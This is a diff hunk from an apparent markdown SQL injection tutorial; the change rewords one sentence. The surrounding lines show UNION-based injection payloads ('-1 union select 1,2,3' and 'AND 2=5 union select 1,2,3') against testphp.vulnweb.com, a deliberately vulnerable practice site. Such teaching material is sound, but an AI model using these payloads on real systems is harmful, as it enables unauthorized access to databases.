@@ -68,7 +68,7 @@ increasing the number i got error at ``order by 4`` which shows we have 3 column
  
  ```http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3```
 
-***Note the - after the = sign*** or using the ``and`` and a false statement like ``1=5`` before the ``union select``
+***Note the - after the = sign*** or using the ``AND statement`` and a false statement like ``1=5`` before the ``union select``
 
 E.G ``http://testphp.vulnweb.com/artists.php?artists=1 AND 2=5 union select 1,2,3`` 
 
